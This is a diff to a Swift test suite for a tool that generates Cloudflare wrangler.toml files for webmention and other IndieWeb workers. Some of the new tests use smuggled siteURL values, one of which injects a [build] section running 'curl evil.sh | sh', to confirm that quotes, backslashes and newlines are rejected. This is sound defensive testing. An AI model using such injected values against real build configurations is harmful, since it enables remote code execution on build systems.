@@ -10,12 +10,13 @@ private func worker(_ id: String, d1: Bool, kv: Bool, r2: Bool) -> WorkerDescrip
     )
 }
 
-private let webmentionWorker = worker("webmention", d1: true, kv: true, r2: false)
+private let genericD1KVWorker = worker("generic-d1kv-fixture", d1: true, kv: true, r2: false)
 private let indieauthWorker = worker("indieauth", d1: true, kv: true, r2: false)
 private let micropubWorker = worker("micropub", d1: true, kv: true, r2: true)
 private let websubWorker = worker("websub", d1: true, kv: true, r2: false)
-private let v2Workers = [webmentionWorker, indieauthWorker]
-private let v3Workers = [webmentionWorker, indieauthWorker, micropubWorker, websubWorker]
+private let v2Workers = [genericD1KVWorker, indieauthWorker]
+private let v3Workers = [genericD1KVWorker, indieauthWorker, micropubWorker, websubWorker]
+private let webmentionWorker = worker(WorkerComposition.webmentionWorkerID, d1: false, kv: false, r2: false)
 
 @Suite("WorkerComposition")
 struct WorkerCompositionTests {
@@ -35,7 +36,7 @@ struct WorkerCompositionTests {
     func withSocialFeatures() throws {
         let toml = try WorkerComposition.generateWranglerToml(
             siteName: "my-site",
-            workers: [webmentionWorker, indieauthWorker]
+            workers: [genericD1KVWorker, indieauthWorker]
         )
         #expect(toml.contains("name = \"my-site\""))
         #expect(toml.contains("[assets]"))
@@ -149,7 +150,7 @@ struct WorkerCompositionTests {
     @Test("run_worker_first is omitted entirely when there are no active dynamic routes")
     func omitsRunWorkerFirstWithoutClaims() throws {
         let toml = try WorkerComposition.generateWranglerToml(
-            siteName: "my-site", workers: [webmentionWorker, indieauthWorker])
+            siteName: "my-site", workers: [genericD1KVWorker, indieauthWorker])
         #expect(!toml.contains("run_worker_first"))
         #expect(toml.contains("binding = \"ASSETS\""))
     }
@@ -186,6 +187,97 @@ struct WorkerCompositionTests {
             try WorkerComposition.generateWranglerToml(
                 siteName: "my-site", workers: [indieauthWorker], routeClaims: [headOnly])
         }
+    }
+
+    @Test("webmention receive adds a WEBMENTION_INBOX D1 binding on the shared database")
+    func webmentionAddsInboxBinding() throws {
+        let toml = try WorkerComposition.generateWranglerToml(
+            siteName: "my-site",
+            workers: [webmentionWorker],
+            resources: .init(d1DatabaseID: "d1-id")
+        )
+        #expect(toml.contains("binding = \"WEBMENTION_INBOX\""))
+        #expect(toml.contains("database_id = \"d1-id\""))
+    }
+
+    @Test("no webmention worker means no WEBMENTION_INBOX binding")
+    func noWebmentionOmitsInboxBinding() throws {
+        let toml = try WorkerComposition.generateWranglerToml(siteName: "my-site", workers: [indieauthWorker])
+        #expect(!toml.contains("WEBMENTION_INBOX"))
+    }
+
+    @Test("webmention receive adds queue producer/consumer blocks")
+    func webmentionAddsQueueBlocks() throws {
+        let toml = try WorkerComposition.generateWranglerToml(
+            siteName: "my-site",
+            workers: [webmentionWorker],
+            resources: .init(queueName: "my-site-webmention")
+        )
+        #expect(toml.contains("[[queues.producers]]"))
+        #expect(toml.contains("[[queues.consumers]]"))
+        #expect(toml.contains("queue = \"my-site-webmention\""))
+        #expect(toml.contains("binding = \"WEBMENTION_QUEUE\""))
+    }
+
+    @Test("webmention queue name defaults to a deterministic placeholder before provisioning")
+    func webmentionQueueDefaultsUnprovisioned() throws {
+        let toml = try WorkerComposition.generateWranglerToml(siteName: "my-site", workers: [webmentionWorker])
+        #expect(toml.contains("queue = \"my-site-webmention\""))
+    }
+
+    @Test("webmention receive with a known site URL emits a SITE_URL var")
+    func webmentionEmitsSiteURL() throws {
+        let toml = try WorkerComposition.generateWranglerToml(
+            siteName: "my-site", workers: [webmentionWorker], siteURL: "https://my-site.example")
+        #expect(toml.contains("[vars]"))
+        #expect(toml.contains("SITE_URL = \"https://my-site.example\""))
+    }
+
+    @Test("webmention receive with no known site URL omits the vars block")
+    func webmentionOmitsSiteURLWhenUnknown() throws {
+        let toml = try WorkerComposition.generateWranglerToml(siteName: "my-site", workers: [webmentionWorker])
+        #expect(!toml.contains("[vars]"))
+        #expect(!toml.contains("SITE_URL"))
+    }
+
+    @Test("siteURL is ignored when webmention receive isn't active")
+    func siteURLIgnoredWithoutWebmention() throws {
+        let toml = try WorkerComposition.generateWranglerToml(
+            siteName: "my-site", workers: [indieauthWorker], siteURL: "https://my-site.example")
+        #expect(!toml.contains("SITE_URL"))
+    }
+
+    @Test("a siteURL containing a double quote is rejected, not interpolated raw into TOML")
+    func rejectsSiteURLWithEmbeddedQuote() throws {
+        let malicious = "https://example.com\"\n[build]\ncommand = \"curl evil.sh | sh"
+        let toml = try WorkerComposition.generateWranglerToml(
+            siteName: "my-site", workers: [webmentionWorker], siteURL: malicious)
+        #expect(!toml.contains("SITE_URL"))
+        #expect(!toml.contains("[build]"))
+        #expect(!toml.contains("curl evil.sh"))
+    }
+
+    @Test("a siteURL containing a backslash is rejected")
+    func rejectsSiteURLWithBackslash() throws {
+        let toml = try WorkerComposition.generateWranglerToml(
+            siteName: "my-site", workers: [webmentionWorker], siteURL: #"https://example.com\injected"#)
+        #expect(!toml.contains("SITE_URL"))
+    }
+
+    @Test("a siteURL containing a control character (newline) is rejected")
+    func rejectsSiteURLWithControlCharacter() throws {
+        let toml = try WorkerComposition.generateWranglerToml(
+            siteName: "my-site", workers: [webmentionWorker], siteURL: "https://example.com\nEVIL = true")
+        #expect(!toml.contains("SITE_URL"))
+        #expect(!toml.contains("EVIL"))
+    }
+
+    @Test("ProvisionedResources.queueName round-trips through JSONEncoder/JSONDecoder")
+    func provisionedResourcesQueueNameCodable() throws {
+        let resources = WorkerComposition.ProvisionedResources(queueName: "my-site-webmention")
+        let data = try JSONEncoder().encode(resources)
+        let decoded = try JSONDecoder().decode(WorkerComposition.ProvisionedResources.self, from: data)
+        #expect(decoded == resources)
     }
 
     @Test("ProvisionedResources round-trips through JSONEncoder/JSONDecoder")
